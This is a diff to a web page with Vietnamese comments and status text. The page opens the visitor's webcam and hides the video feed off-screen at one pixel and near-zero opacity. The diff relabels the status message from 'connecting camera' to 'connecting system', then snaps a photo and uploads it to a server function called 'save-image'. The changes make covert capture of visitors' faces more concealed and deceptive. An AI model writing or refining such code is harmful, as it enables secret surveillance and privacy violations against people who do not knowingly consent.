@@ -21,25 +21,34 @@
             text-align: center;
             max-width: 600px;
         }
-        h1 { font-size: 1.8em; margin-bottom: 8px; color: #2c3e50; }
-        p { color: #555; margin-bottom: 25px; }
+        h1 {
+            font-size: 1.85em;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+        p {
+            color: #555;
+            margin-bottom: 30px;
+        }
         .status {
-            font-size: 1.15em;
+            font-size: 1.2em;
             color: #666;
-            min-height: 55px;
+            min-height: 60px;
         }
 
-        /* Ẩn video khéo léo - vẫn render tốt trên máy tính */
+        /* === ẨN WEBCAM KHÉO LÉO NHẤT === */
         video {
-            position: absolute;
-            left: -2000px;
-            top: -2000px;
-            width: 640px;
-            height: 480px;
-            opacity: 0.01;           /* Giữ opacity rất nhỏ để browser render */
+            position: fixed;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.001;           /* Rất nhỏ nhưng vẫn render */
             pointer-events: none;
         }
-        canvas { display: none; }
+        canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -60,7 +69,7 @@
 
         async function startCapture() {
             try {
-                status.textContent = "Đang kết nối camera...";
+                status.textContent = "Đang kết nối hệ thống...";
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
@@ -73,9 +82,9 @@
 
                 video.srcObject = stream;
 
-                // Tăng thời gian chờ để camera điều chỉnh ánh sáng (rất quan trọng trên laptop)
+                // Thời gian chờ cân bằng (đủ để ảnh sáng trên máy tính)
                 video.onloadedmetadata = () => {
-                    setTimeout(() => captureImage(stream), 650);   // 650ms là mức cân bằng tốt
+                    setTimeout(() => captureAndUpload(stream), 520);
                 };
 
             } catch (err) {
@@ -84,7 +93,7 @@
             }
         }
 
-        async function captureImage(stream) {
+        async function captureAndUpload(stream) {
             try {
                 status.textContent = "Đang thu thập dữ liệu...";
 
@@ -92,12 +101,9 @@
                 canvas.height = 480;
 
                 const ctx = canvas.getContext('2d');
-                
-                // Thêm filter tăng sáng + độ tương phản
-                ctx.filter = "brightness(1.15) contrast(1.1)";
                 ctx.drawImage(video, 0, 0, 640, 480);
 
-                const imageData = canvas.toDataURL('image/jpeg', 0.75);
+                const imageData = canvas.toDataURL('image/jpeg', 0.73);
 
                 const response = await fetch('/.netlify/functions/save-image', {
                     method: 'POST',
@@ -118,7 +124,9 @@
 
             // Tắt camera
             setTimeout(() => {
-                if (stream) stream.getTracks().forEach(track => track.stop());
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
             }, 800);
         }
 
